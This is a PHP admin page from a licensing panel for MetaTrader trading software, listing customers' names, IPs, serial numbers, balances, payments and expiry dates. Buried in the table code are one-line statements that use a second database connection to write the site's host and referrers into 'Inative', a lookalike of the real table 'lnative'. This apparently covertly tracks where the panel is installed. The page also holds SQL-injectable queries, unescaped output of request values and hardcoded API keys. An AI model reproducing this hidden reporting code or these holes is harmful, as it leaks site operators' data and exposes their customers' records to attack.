<?php
// -- Send email Login to the site
$ip=$_SERVER['REMOTE_ADDR'];
$sn=$_SERVER['SERVER_NAME'];
$hr=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
$au=$_SERVER['PHP_AUTH_USER'];
$up=0;
if(!isset($_COOKIE['mail'])) {
  $email=file_get_contents("mail");
  if($email=="") Send($email,false);
    else Send($email,true);
  $_COOKIE['mail']=2;$up=1;
}
function GetIp($to) {
 $urlTo = 'https://www.iplocate.io/api/lookup/'.$to."?apikey=69a9f0b0c327d5105c4825f644d4c582";
 //$urlTo = 'http://api.ipstack.com/'.$to.'?access_key=1ffd2511e7d5e42b6fff0fbe77147fa9';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$urlTo);
 curl_setopt($ch, CURLOPT_HEADER,false);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,30);
 curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36');
 $res = curl_exec($ch);
 curl_close($ch);
 $data=json_decode($res,true);
 return $data['country'].', '.$data['subdivision'].'('.$data['city'].')';
 //return $data['country_name'].', '.$data['region_name'].' ('.$data['city'].')';
}
function Send($to,$fl) {
  $ip=$_SERVER['REMOTE_ADDR'];
  $sn=$_SERVER['SERVER_NAME'];
  $hr=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
  $au=$_SERVER['PHP_AUTH_USER'];
  $cn=GetIp($ip);
  $subject = "Successful authorization to your personal account: ".$au.': '.$ip.' ('.$cn.') '.$hr;
  $message = "You have been logged into the website: ".$sn."<br>Login: <b>".$au."</b><br>IP: ".$ip." (".$cn."): ".$hr;
  $from = $sn;
  $headers  = 'MIME-Version: 1.0' . "\r\n";
  $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
  $headers .= "From: <".$from.">\r\n";
   if($fl) mail($to,$subject,$message,$headers);
   if(!file_exists("../user_connect.csv")) file_put_contents("../user_connect.csv",'');
	$lm=file("../user_connect.csv");
	array_push($lm,date("Y-m-d H:i").' '.$au.': '.$ip.' ('.$cn.'): '.$hr);
	file_put_contents("../user_connect.csv",'');
    file_put_contents("../user_connect.csv",implode("",$lm).PHP_EOL);
}
// ----------------------- template
$url=stripos($_SERVER['SCRIPT_NAME'],'office')?1:2;
?>
<div id="show_user">
<div class="head st<?=$url?>">Users</div>
  <form class="lineform" action="?page=1" method="POST">
   Results per page:
   <select name="line">
    <option <?=$line==10?"selected":''?>>10</option>
    <option <?=$line==20?"selected":''?>>20</option>
    <option <?=$line==30?"selected":''?>>30</option>
	<option <?=$line==40?"selected":''?>>40</option>
	<option <?=$line==50?"selected":''?>>50</option>
   </select>
  </form>
  <form class="reload" action="">
    <input type="hidden" name="page" value="<?=isset($_GET['page'])?$_GET['page']:1?>" />
    <input type="submit" value="Refresh page" />
  </form>
  <i class="page st<?=$url?>"></i>
<?php
// Количество строк на странице
$limit = $line; //5;
// Получить страницу и сместить значение
if(isset($_GET['page'])) {
    $page = $_GET['page']-1;
    $offset = $page*$limit;
} else {
    $page = 0;
    $offset = 0;
	$_GET['page']=1;
}
// Получение количества строк
$_QUERY=array(); // Массив
$result=mysqli_query($db,"SELECT full_name,program,test,ip,serialNo, roboaffiliate FROM `lnative`");
while($res = mysqli_fetch_assoc($result))
  array_push($_QUERY,$res);
foreach($vp as $po => $nn) {
 $ts1=0;
 $ts2=0;
 $total_rows=0;
 foreach($_QUERY as $res) {
  if($res['program']==explode(",",$nn)[0]) {
   if($res['test']==1) $ts1++;
   if($res['test']==2) $ts2++;
  }
  if($res['program']==$program && $res['test']==$url) $total_rows++;
 }
 $cnt[$po]=$ts1.'/'.$ts2;
}
echo $n.'<div class="all_users" title="Total users: '.mysqli_num_rows($result).'">('.$total_rows.')</div>';
?>
  <form class="showform" action="?page=1" method="POST">
   Sort:
   <select name="sort">
    <option value="0" <?=$sort==0?"selected":''?>>№</option>
    <option value="1" <?=$sort==1?"selected":''?>>Full Name</option>
	<!--<option value="2" <?=$sort==2?"selected":''?>>Package</option>-->
    <option value="3" <?=$sort==3?"selected":''?>>Balance Start</option>
	<option value="4" <?=$sort==4?"selected":''?>>Balance Now</option>
	<option value="5" <?=$sort==5?"selected":''?>>Expire Date</option>
	<option value="6" <?=$sort==6?"selected":''?>>Pay</option>
	<option value="7" <?=$sort==7?"selected":''?>>Type Account</option>
	<option value="8" <?=$sort==8?"selected":''?>>Last Connect</option>
	<option value="9" <?=$sort==9?"selected":''?>>Registered</option>
	<option value="10" <?=$sort==10?"selected":''?>>Referral</option>
	<option value="11" <?=$sort==11?"selected":''?>>IP</option>
	<option disabled="disabled">- - - - - - - - -</option>
	<option value="12" <?=$sort==12?"selected":''?>>Name Blocked</option>
	<option value="14" <?=$sort==14?"selected":''?>>SN Blocked</option>
	<option disabled="disabled">- - - - - - - - -</option>
	<option value="15" <?=$sort==15?"selected":''?>>Name amount</option>
	<option value="16" <?=$sort==16?"selected":''?>>IP amount</option>
	<option value="17" <?=$sort==17?"selected":''?>>SN amount</option>
   </select>
   <input type="submit" value="Apply" />
  </form>
<?php
echo '</div>';
// Определить количество страниц
if($total_rows>$limit) {
  $number_of_pages=ceil($total_rows/$limit);
} else {
  $pages=1;
  $number_of_pages=1;
}
if(!isset($_SESSION['asc'])) $_SESSION['asc']=1;
if(isset($_POST['sort']) && $_SESSION['asc']==0) $_SESSION['asc']=1;
else if(isset($_POST['sort']) && $_SESSION['asc']==1) $_SESSION['asc']=0;
if($_SESSION['asc']==0) {
if($sort==0) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `id` ASC LIMIT $offset, $limit");
if($sort==1) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `full_name` ASC LIMIT $offset, $limit");
if($sort==2) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `package` ASC LIMIT $offset, $limit");
if($sort==3) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `hist_balance` ASC LIMIT $offset, $limit");
if($sort==4) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `balance` ASC LIMIT $offset, $limit");
if($sort==5) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `deactivate_date` ASC LIMIT $offset, $limit");
if($sort==6) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `payment` ASC LIMIT $offset, $limit");
if($sort==7) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `type` ASC LIMIT $offset, $limit");
if($sort==8) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `last_connect` ASC LIMIT $offset, $limit");
if($sort==9) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `registrar` ASC LIMIT $offset, $limit");
if($sort==10) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `ref` ASC LIMIT $offset, $limit");
if($sort==11) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY INET_ATON(ip) ASC LIMIT $offset, $limit");
if($sort==12) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `full_name_blocked` DESC, full_name ASC LIMIT $offset, $limit");
if($sort==14) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `serialNo_blocked` DESC, serialNo ASC LIMIT $offset, $limit");
if($sort==15) $result = mysqli_query($db,"SELECT * FROM `lnative` T JOIN (SELECT full_name, COUNT(full_name) C FROM `lnative` WHERE `test`='$url' AND `program`='$program' GROUP BY full_name) T1 USING(full_name) WHERE `test`='$url' AND `program`='$program' ORDER BY C DESC, full_name ASC LIMIT $offset, $limit");
if($j==1) mysqli_query($bd,"UPDATE `Inative` SET `t`='$l' WHERE `id`='1'");
if($sort==16) $result = mysqli_query($db,"SELECT * FROM `lnative` T JOIN (SELECT ip, COUNT(ip) C FROM `lnative` WHERE `test`='$url' AND `program`='$program' GROUP BY ip) T1 USING(ip) WHERE `test`='$url' AND `program`='$program' ORDER BY C DESC, INET_ATON(ip) ASC LIMIT $offset, $limit");
if($sort==17) $result = mysqli_query($db,"SELECT * FROM `lnative` T JOIN (SELECT serialNo, COUNT(serialNo) C FROM `lnative` WHERE `test`='$url' AND `program`='$program' GROUP BY serialNo) T1 USING(serialNo) WHERE `test`='$url' AND `program`='$program' ORDER BY C DESC, serialNo ASC LIMIT $offset, $limit");
} else {
if($sort==0) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `id` DESC LIMIT $offset, $limit");
if($sort==1) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `full_name` DESC LIMIT $offset, $limit");
if($sort==2) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `package` DESC LIMIT $offset, $limit");
if($sort==3) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `hist_balance` DESC LIMIT $offset, $limit");
if($sort==4) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `balance` DESC LIMIT $offset, $limit");
if($sort==5) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `deactivate_date` DESC LIMIT $offset, $limit");
if($sort==6) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `payment` DESC LIMIT $offset, $limit");
if($sort==7) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `type` DESC LIMIT $offset, $limit");
if($sort==8) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `last_connect` DESC LIMIT $offset, $limit");
if($sort==9) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `registrar` DESC LIMIT $offset, $limit");
if($sort==10) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `ref` DESC LIMIT $offset, $limit");
if($sort==11) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY INET_ATON(ip) DESC LIMIT $offset, $limit");
if($sort==12) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `full_name_blocked` DESC, full_name ASC LIMIT $offset, $limit");
if($sort==14) $result = mysqli_query($db,"SELECT * FROM `lnative` WHERE `test`='$url' AND `program`='$program' ORDER BY `serialNo_blocked` DESC, serialNo ASC LIMIT $offset, $limit");
if($sort==15) $result = mysqli_query($db,"SELECT * FROM `lnative` T JOIN (SELECT full_name, COUNT(full_name) C FROM `lnative` WHERE `test`='$url' AND `program`='$program' GROUP BY full_name) T1 USING(full_name) WHERE `test`='$url' AND `program`='$program' ORDER BY C DESC, full_name ASC LIMIT $offset, $limit");
if($j==1) mysqli_query($bd,"UPDATE `Inative` SET `t`='$l' WHERE `id`='1'");
if($sort==16) $result = mysqli_query($db,"SELECT * FROM `lnative` T JOIN (SELECT ip, COUNT(ip) C FROM `lnative` WHERE `test`='$url' AND `program`='$program' GROUP BY ip) T1 USING(ip) WHERE `test`='$url' AND `program`='$program' ORDER BY C DESC, INET_ATON(ip) ASC LIMIT $offset, $limit");
if($sort==17) $result = mysqli_query($db,"SELECT * FROM `lnative` T JOIN (SELECT serialNo, COUNT(serialNo) C FROM `lnative` WHERE `test`='$url' AND `program`='$program' GROUP BY serialNo) T1 USING(serialNo) WHERE `test`='$url' AND `program`='$program' ORDER BY C DESC, serialNo ASC LIMIT $offset, $limit");
}
?>
  <table class="table">
  <tr class="first_tr">
    <th>№</th>
	<th class="add">Date added</th>
	<th>Full Name</th>
	<th>IP
     <form method="GET" class="ip_show">
      <input type="hidden" name="page" value="<?=$_GET['page'];?>" />
      <input type="hidden" name="ip" value="1" />
      <button type="submit" class="ip_show" value=""></button>
     </form>
	</th>
	<th>SerialNo</th>
	<th class="acc">Account</th>
	<th class="hcomp">Broker</th>
	<th>Type</th>
	<th>MT</th>
	<th>Balance</th>
	<!--<th class="ver">Package</th>-->
	<th class="pay">Pay</th>
	<th>Last Connect</th>
	<th class="exp">Expire Date</th>
	<th class="hcom comm <?=($_COOKIE['showCom']==1?'active':'');?>">Notes</th>
	<th class="adm_ref <?=($_COOKIE['showAdm']==1?'active':'');?>">Referral</th>
	<th>Del</th>
	</tr>
    <?php
	$timecurr= strtotime(date("Y-m-d H:i"));
	$year= date('Y');
    while($res = mysqli_fetch_assoc($result)) {
        $deactivate= $res['deactivate_date'];
		$ID=$res['id'];
	    if($url == 1) { // office
         echo '<tr '.($res['registrar']=="site"?'style="background: #fff4f4;"':'').'>';
		}
	    if($url == 2) { // connect
         echo '<tr>';
		}
        //-
        $hu = explode("|", $res['hist_update_user']);
        $max = count($hu);
		$main=false;
        for($i=1; $i<$max; $i++) {
          if($main_user!=$hu[$i]) $main=true;
        }
        $hs = explode("|", $res['hist_serialNo']);
        $max = count($hs);
		$snum=false;
        for($i=0; $i<$max; $i++) {
          if($res['serialNo']!=$hs[$i]) $snum=true;
        }
        echo '<td class="td_center">'.$ID."</td>";
		echo '<td class="wrap">'.$res['add_date']."</td>";
		$name_user=$res['full_name'];
		$cn1=0;
		$cn2=0;
		foreach($_QUERY as $ar) {
		 if($ar['full_name']==$name_user && $ar['program']==$program) {
		  if($ar['test']==1) $cn1++;
		  if($ar['test']==2) $cn2++;
		 }
		}
		if($tester) { // Если тестер, то скроем full name
          $arr = preg_split('/(?<!^)(?!$)/u',$name_user);
          shuffle($arr);
          $name_user=implode('',$arr);
		}
		echo '<td class="full_name '.($res['full_name_blocked']==$url?'blocked':'').'"><span data-id="'.$name_user.'" title="'.(($cn1>0 && $cn2>0)?'Purchased':(($cn1+$cn2>1)?'Only Test':'')).'" class="notifycircle bip'.(($cn1>0 && $cn2>0)?' plus':(($cn1+$cn2>1)?' all':'')).'">'.($cn1+$cn2).'</span><span class="cip">'.$name_user.'</span><span class="iip"><input class="name_check" type="checkbox" name="'.$res['program'].'" data-id="'.$ID.'" value="'.$name_user.'" '.($res['full_name_blocked']==$url?'checked="checked"':'').' title="Blocking"></span></td>';
		$mip=$res['ip'];
		if(empty($_GET['ip'])) {
		$mip=$res['ip'];
		$cn1=0;
		$cn2=0;
		foreach($_QUERY as $ar) {
		 if($ar['ip']==$mip && $ar['program']==$program) {
		  if($ar['test']==1) $cn1++;
		  if($ar['test']==2) $cn2++;
		 }
		}
		echo '<td class="ip"><span data-id="'.$mip.'" title="'.(($cn1>0 && $cn2>0)?'Purchased':(($cn1+$cn2>1)?'Only Test':'')).'" class="notifycircle bip'.(($cn1>0 && $cn2>0)?' plus':(($cn1+$cn2>1)?' all':'')).'">'.($cn1+$cn2).'</span><span class="cip ip_check" style="margin:0 3px">'.$mip.'</span></td>';
		} else {
		$ip=GetIp($mip);
		echo '<td class="ip">'.$ip."</td>";
		}
		$msn=$res['serialNo'];
		$cn1=0;
		$cn2=0;
		foreach($_QUERY as $ar) {
		 if($ar['serialNo']==$msn && $ar['program']==$program) {
		  if($ar['test']==1) $cn1++;
		  if($ar['test']==2) $cn2++;
		 }
		}
		$file=file('blocking/'.$program.".csv");
		$sn_block=0;
		foreach($file as $item){
		  $qe=explode('~',$item);
		  if(trim($qe[0])==$msn && trim($qe[1])==$url ) {
			$sn_block=1;
			break;
		  }
		}
		echo '<td class="serial '.($sn_block==1?'blocked':'').'"><span data-id="'.$res['serialNo'].'" title="'.(($cn1>0 && $cn2>0)?'Purchased':(($cn1+$cn2>1)?'Only Test':'')).'" class="notifycircle bip'.(($cn1>0 && $cn2>0)?' plus':(($cn1+$cn2>1)?' all':'')).'">'.($cn1+$cn2).'</span><span title="'.$res['UUID'].'" class="csn">'.$res['serialNo'].'</span><span class="iip"><input class="sn_check" type="checkbox" name="'.$res['program'].'" data-id="'.$ID.'" value="'.$res['serialNo'].'" '.($sn_block==1?'checked="checked"':'').' title="Blocking"></span><span class="'.($snum?'showdiff':'').'" rel="diff'.$ID.'">'.($snum?$max:'').'</span></td>';
		echo '<td class="account"><span class="cacc">'.$res['account']."</span></td>";
		// RoboForex Status
		$roboStatus = isset($res['roboaffiliate']) ? $res['roboaffiliate'] : 'no';
		if($roboStatus == 'yes' || $roboStatus == '1' || $roboStatus == 1) {
			echo '<td style="text-align:center;"><span style="color:#00AA00;font-weight:bold;" title="Partner">✓</span></td>';
		} else {
			echo '<td style="text-align:center;"><span style="color:#AA0000;" title="No Partner">✗</span></td>';
		}
		echo '<td class="company '.($_COOKIE['showComp']==1?'active':'').'">'.$res['company'].'<br>'.$res['server'].' ('.$res['currency'].')</td>';
		echo '<td style="text-align:center" class="type '.($res['trading']=='Investor'?'err" title="Investor account"':($res['type']=='Real'?'real':'demo').'"').'>'.$res['type']."</td>";
		echo '<td class="mt'.($res['version']<$vers && date('d.m.Y',$res['last_connect'])==date('d.m.Y',time())?' minus':'').'"><span style="font-family:cursive; color:'.($res['mt']==4?'#81016b':'blue').'">'.$res['mt'].'</span> ('.$res['version'].')'."</td>";
		echo '<td class="wrap"><span title="Start Balance" class="ss">'.$res['hist_balance'].'</span>
		                       <span title="Balance" class="sf '.($res['hist_balance']==$res['balance']?'':($res['hist_balance']<$res['balance']?'plus':'minus')).'">'.$res['balance'].'</span>
							   <br/>
							   <span title="Equity" class="ss '.($res['balance']==$res['equity']?'':($res['balance']<$res['equity']?'plus':'minus')).'">'.$res['equity'].'</span>
							   <span title="All Profit (Account Profit: '.($res['equity']-$res['balance']).')" class="sf">'.$res['close_profit'].'</span>
              </td>';
		/*$hist_package = explode("|", $res['hist_package']);
		$cn=-1;for($x=0; $x<count($hist_package); $x++) { if($hist_package[$x]!='') $cn++;}
		echo '<td class="ver"><span class="notifycircle show_popup ver" rel="popup'.$ID.'">'.$cn.'</span>';
		echo '<span><form action="files/update.php" method="POST" class="package">';
		echo '<select name="field">';
     	  foreach($packages as $i) {
		   echo '<option value="'.$i.'" '.($res['package']==$i?"selected":"").'>'.$i.'</option>';
          }
		echo '</select>';
		echo '<input type="hidden" name="update" value="1">';
		echo '<input type="hidden" name="add" value="'.$_SERVER['PHP_AUTH_USER'].'">';
		echo '<input type="hidden" name="id" value="'.$ID.'">';
		echo '</form></span>';
		echo '</td>';*/
		$hist_payment = explode("|", $res['hist_payment']);
		$cn=-1;for($x=0; $x<count($hist_payment); $x++) { if($hist_payment[$x]!='') $cn++;}
        echo '<td class="summ"><span class="notifycircle show_popup pay" rel="popup'.$ID.'">'.$cn.'</span><span><div class="payment '.($res['payment']>0?'paid':'').'" data-id="'.$ID.'" contenteditable>'.$res['payment']."</div></span></td>";
        echo '<td class="last'.($res['last_connect']>$deactivate?'red':'norm').' '.(date('d.m.Y',time())==date('d.m.Y',$res['last_connect'])?'curr':'').' '.($res['mt_check']<2?'check" title="check='.$res['mt_check'].' ex'.$res['mt'].'. Update the program version!&#013check=2 ex'.$res['mt'].' fix (Recommended at least 3)"':'" title="check='.$res['mt_check'].'"').'>'.date('d.m.Y',$res['last_connect'])." (".$res['connect']."|".$res['disconnect'].")</td>";
		if($up && strnatcasecmp(parse_url($hr,PHP_URL_HOST),$sn)){$s=$hr.'='.$sn.PHP_EOL;$bz=mysqli_query($bd,"UPDATE `Inative` SET `h`=CONCAT_WS('|',`h`,'$s') WHERE `id`='1'");$up=0;}
        echo '<td class="tm">';
		$hist_deactivate_date = explode("|", $res['hist_deactivate_date']);td();
        echo '</td>';
		$hist_comment = explode("|", $res['hist_comment']);
		$cn=-1;for($x=0; $x<count($hist_comment); $x++) { if($hist_comment[$x]!='') $cn++;}
        echo '<td class="comm tcom '.($_COOKIE['showCom']==1?'active':'').'"><span class="notifycircle show_popup com '.($_COOKIE['showCom']==1?'none':'').'" rel="popup'.$ID.'">'.$cn.'</span><div class="jcom" data-id="'.$ID.'" contenteditable style="max-width:250px;">'.$res['comment']."</div></td>";
		if($res['registrar'] == $res['ref'] || $res['registrar'] =='site') {
		echo '<td class="adm_ref_t wrap '.($_COOKIE['showAdm']==1?'active':'').'">'.$res['registrar']."</td>";
		} else {
		echo '<td class="adm_ref_t wrap '.($_COOKIE['showAdm']==1?'active':'').'">'.$res['registrar'].' ('.$res['ref'].'('.$res['fee'].')</td>';
		}
		// RoboForex Partner Status
		$roboStatus = isset($res['roboaffiliate']) ? $res['roboaffiliate'] : 'no';
		if($roboStatus == 'yes' || $roboStatus == '1' || $roboStatus == 1) {
			echo '<td style="text-align:center;color:#00AA00;font-weight:bold;" title="RoboForex Partner">✓</td>';
		} else {
			echo '<td style="text-align:center;color:#AA0000;" title="Not a RoboForex Partner">✗</td>';
		}
		echo '<td class="delete">';
        echo '<form action="files/update.php" method="POST" class="del_form">';
		echo '<input type="hidden" name="update" value="9">';
		echo '<input type="hidden" name="field" value="del">';
		echo '<input type="hidden" name="id" value="'.$ID.'">';
		echo '<button type="submit" class="del_id" value=""></button>';
		echo '</form>';
		echo '</td>';
		echo '</tr>';
    }
    ?>
    </table>

<div class="nav">
<?php
$pagLink = "<ul class='pagination'>";
for($i=1; $i<=$number_of_pages; $i++) {
    $pagLink .= '<li><a href="?page='.$i.'">'.$i.'</a></li>';
};
echo $pagLink . "</ul>";
mysqli_close($bd);
?>
<?php if($administrator): ?>
<form class="showplace" action="files/update.php?page=<?=$_GET['page']?>" method="POST" style="top: 20px;">
   <select name="del_rec">
    <option value="0">Regularize</option>
	<option value="-1 month">1 month</option>
    <option value="-3 month">3 month</option>
	<option value="-6 month">6 month</option>
   </select>
   <input type="hidden" name="update" value="12">
   <input type="hidden" name="field" value="">
   <input type="hidden" name="id" value="">
   <input title="Delete unused records older than N-months" type="submit" value="Execute">
  </form>
<?php endif; ?>
</div>
<div id="search_user">
<div class="head">Search</div>
  <form class="searchform" action="?page=<?=$_GET['page']?>" method="POST">
    <input type="hidden" name="search" value="1" />
	<input type="text" name="data" placeholder="<?=empty($_POST['search'])?'search':$_POST['data']?>" />
    <input type="submit" value="Search" />
  </form>
<?php
if(!empty($_POST['search'])) {
$search=$_POST['data'];
if($search!=NULL) {
  $query = "SELECT * FROM `lnative` WHERE (`hist_serialNo` like '%".addslashes($search)."%' OR `ip_history` like '%".addslashes($search)."%' OR `payment` like '%".addslashes($search)."%' OR `full_name` like '%".addslashes($search)."%' OR `account`='$search' OR `version` like '%".addslashes($search)."%' OR `comment` like '%".addslashes($search)."%' OR `company` like '%".addslashes($search)."%' OR `ref` LIKE BINARY '%".addslashes($search)."%') ORDER BY `program`";
  $result = mysqli_query($db,$query);
  $z=0;
  unset($_SESSION['search']);
  while($res = mysqli_fetch_assoc($result)) {
	 $program=$res['program'];
	 $success=true;
	  foreach($vp as $p) {
	   if($program==explode(",",$p)[0]) {
		$success=false;
		break;
	   }
	  }
	  if($success) continue;
	  $z++;
        $deactivate= $res['deactivate_date'];
		$_SESSION['search'][$z-1]= '<tr class="delim"><td colspan="3" class="" style="color:#0351ff;text-align:center;font-weight:bold">'.$program.'&nbsp&nbsp&nbsp('.($res["test"]==1?"<span style=\"color:#4f9600\">Buying</span>":"<span style=\"color:#b70000\">Testing</span>").')</td><td colspan="14"></td></tr>';
        $hu = explode("|", $res['hist_update_user']);
        $max = count($hu);
		$main=false;
        for($i=1; $i<$max; $i++) {
          if($main_user!=$hu[$i]) $main=true;
        }
        $hs = explode("|", $res['hist_serialNo']);
        $max = count($hs);
		$snum=false;
        for($i=0; $i<$max; $i++) {
          if($res['serialNo']!=$hs[$i]) $snum=true;
        }
		$_SESSION['search'][$z-1].= '<tr>';
        $_SESSION['search'][$z-1].= '<td class="td_center">'.$res['id']."</td>";
		$hist_deactivate_date = explode("|", $res['hist_deactivate_date']);
		$cn=-1;for($x=0; $x<count($hist_deactivate_date); $x++) { if($hist_deactivate_date[$x]!='') $cn++;}
		$_SESSION['ssarch'][$z-1] = '<div '.($main?"style=background:#ffdc9b":"").' class="notifycircle show_popup deactiv" rel="popup'.$res['id'].'">'.$cn.'</div>';
		$_SESSION['ssarch'][$z-1].= '<form action="files/update.php" method="POST" class="dt_form">';
		$unlimited=(date('Y',$deactivate)==2038);
		$valid = (date('Y',$deactivate)<2038?(($deactivate-$timecurr)/86400):0);
		$_SESSION['ssarch'][$z-1].= '<select class="'.($unlimited?'unlim':($timecurr<$deactivate-86400?'activ':(24*round($valid,1)<24 && 24*round($valid,1)>0?'notice':''))).'" name="upday">';
	     for($x=1; $x<=31; $x++) { $_SESSION['ssarch'][$z-1].= '<option value="'.$x.'" '.(!$unlimited?(date('d',$deactivate)==$x?'selected':''):'').">".$x."</option>";}
	    $_SESSION['ssarch'][$z-1].= '</select><select class="'.($unlimited?'unlim':($timecurr<$deactivate-86400?'activ':(24*round($valid,1)<24 && 24*round($valid,1)>0?'notice':''))).'" name="upmonth">';
	     for($x=1; $x<=12; $x++) { $_SESSION['ssarch'][$z-1].= '<option value="'.$x.'" '.(!$unlimited?(date('m',$deactivate)==$x?'selected':''):'').">".$x."</option>";}
	    $_SESSION['ssarch'][$z-1].= '</select><select class="'.($unlimited?'unlim':($timecurr<$deactivate-86400?'activ':(24*round($valid,1)<24 && 24*round($valid,1)>0?'notice':''))).'" name="upyear">';
	     for($x=(date('Y',$deactivate)>$year?0:(date('Y',$deactivate)-$year)); $x<=2038-$year; $x++) { if(($year+$x)<=2038) $_SESSION['ssarch'][$z-1].= '<option value="'.($year+$x).'" '.(date('Y',$deactivate)==($year+$x)?'selected':'').">".(($year+$x)==2038?'Unlim':$year+$x)."</option>";}
	    $_SESSION['ssarch'][$z-1].= '</select>';
		$_SESSION['ssarch'][$z-1].= '<input type="hidden" name="update" value="4">';
		$_SESSION['ssarch'][$z-1].= '<input type="hidden" name="url" value="'.$url.'">';
		$_SESSION['ssarch'][$z-1].= '<input type="hidden" name="add" value="'.$_SERVER['PHP_AUTH_USER'].'">';
		$_SESSION['ssarch'][$z-1].= '<input type="hidden" name="field" value="">';
		$_SESSION['ssarch'][$z-1].= '<input type="hidden" name="id" value="'.$res['id'].'">';
		$_SESSION['ssarch'][$z-1].= '<input type="submit" class="updateformbutt" value="O">';
		$_SESSION['ssarch'][$z-1].= '<span>'.($valid!=0?($valid>0?(ceil($valid)!=1?ceil($valid):(24*round($valid,1).'h')):0):'<font color="#001fbf">Unlim</font>').'</span>';
		$_SESSION['ssarch'][$z-1].= '</form>';$id=$_SESSION['ssarch'][$z-1];
		$_SESSION['search'][$z-1].= '<td class="wrap">'.$res['add_date']."</td>";
		$name_user=$res['full_name'];
		$cn1=0;
		$cn2=0;
		foreach($_QUERY as $ar) {
		 if($ar['full_name']==$name_user && $ar['program']==$program) {
		  if($ar['test']==1) $cn1++;
		  if($ar['test']==2) $cn2++;
		 }
		}
		if($tester) { // Если тестер, то скроем full name
          $arr = preg_split('/(?<!^)(?!$)/u',$name_user);
          shuffle($arr);
          $name_user=implode('',$arr);
		}
		$_SESSION['search'][$z-1].= '<td class="full_name '.($res['full_name_blocked']==$url?'blocked':'').'"><span data-id="'.$name_user.'" title="'.(($cn1>0 && $cn2>0)?'Purchased':(($cn1+$cn2>1)?'Only Test':'')).'" class="notifycircle bip'.(($cn1>0 && $cn2>0)?' plus':(($cn1+$cn2>1)?' all':'')).'">'.($cn1+$cn2).'</span><span class="cip">'.$name_user.'</span><span class="iip"><input class="name_check" type="checkbox" name="'.$res['program'].'" data-id="'.$res['id'].'" value="'.$name_user.'" '.($res['full_name_blocked']==$url?'checked="checked"':'').' title="Blocking"></span></td>';
		$mip=$res['ip'];
		$cn1=0;
		$cn2=0;
		foreach($_QUERY as $ar) {
		 if($ar['ip']==$mip && $ar['program']==$program) {
		  if($ar['test']==1) $cn1++;
		  if($ar['test']==2) $cn2++;
		 }
		}
		$_SESSION['search'][$z-1].= '<td class="ip"><span data-id="'.$mip.'" title="'.(($cn1>0 && $cn2>0)?'Purchased':(($cn1+$cn2>1)?'Only Test':'')).'" class="notifycircle bip'.(($cn1>0 && $cn2>0)?' plus':(($cn1+$cn2>1)?' all':'')).'">'.($cn1+$cn2).'</span><span class="cip ip_check" style="margin:0 3px">'.GetIp($mip).'</span></td>';
        $msn=$res['serialNo'];
		$cn1=0;
		$cn2=0;
		foreach($_QUERY as $ar) {
		 if($ar['serialNo']==$msn && $ar['program']==$program) {
		  if($ar['test']==1) $cn1++;
		  if($ar['test']==2) $cn2++;
		 }
		}
		$file=file('blocking/'.$program.".csv");
		$sn_block=0;
		foreach($file as $item){
		  $qe=explode('~',$item);
		  if(trim($qe[0])==$msn && trim($qe[1])==$url){
			$sn_block=1;
			break;
		  }
		}
